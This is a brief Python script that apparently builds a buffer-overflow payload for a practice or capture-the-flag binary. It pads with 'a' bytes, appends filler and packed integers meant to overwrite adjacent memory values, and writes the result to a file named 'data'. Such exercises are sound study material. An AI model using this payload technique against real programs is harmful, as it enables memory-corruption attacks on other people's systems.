import struct

p32 = lambda x: struct.pack('I', x)
payload = 'a' * 20 + '111122223333' + p32(0xffffffff) + p32(7) + p32(8)

with open("data", "wb") as f:
    f.write(payload)
